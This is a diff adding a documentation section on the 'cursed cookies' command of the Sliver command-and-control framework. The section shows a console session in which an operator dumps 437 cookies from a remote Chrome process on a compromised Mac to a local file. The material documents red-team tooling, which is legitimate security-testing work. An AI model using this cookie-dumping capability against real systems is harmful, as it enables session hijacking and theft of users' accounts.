@@ -29,3 +29,20 @@ The `cursed console` command can be used to start an interactive REPL with any c
 
 <img width="1411" alt="Screen Shot 2022-09-02 at 4 31 44 PM" src="https://user-images.githubusercontent.com/875022/188246398-97e5c7dd-1c21-4aeb-a57e-222fda826e66.png">
 
+## Cursed Cookies
+
+Starting in v1.5.28 the `cursed cookies` command can be used to dump a remote cursed process' cookies to a local file (newline delimited json), for example:
+
+```
+[server] sliver (CHRONIC_GOAT) > cursed chrome
+
+...
+
+[server] sliver (CHRONIC_GOAT) > cursed cookies 
+
+? Select a curse: 44199  [Session 56a5cd6f]  /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
+
+[*] Successfully dumped 437 cookies
+[*] Saved to cookies-20220925182151.json
+
+```
